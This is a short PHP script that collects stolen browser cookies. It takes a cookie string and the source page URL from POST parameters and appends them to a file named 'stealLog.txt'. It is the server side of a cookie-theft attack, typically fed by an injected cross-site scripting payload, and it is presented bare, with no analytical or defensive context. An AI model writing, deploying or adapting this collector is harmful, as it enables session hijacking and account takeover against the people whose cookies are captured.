<?php
$cookies = $_POST['c'];
$cUrl = $_POST['cUrl'];
$file = fopen('stealLog.txt', 'a+');
fwrite($file, $cUrl . " " . $cookies . " " . "\n\n");
fclose($file);
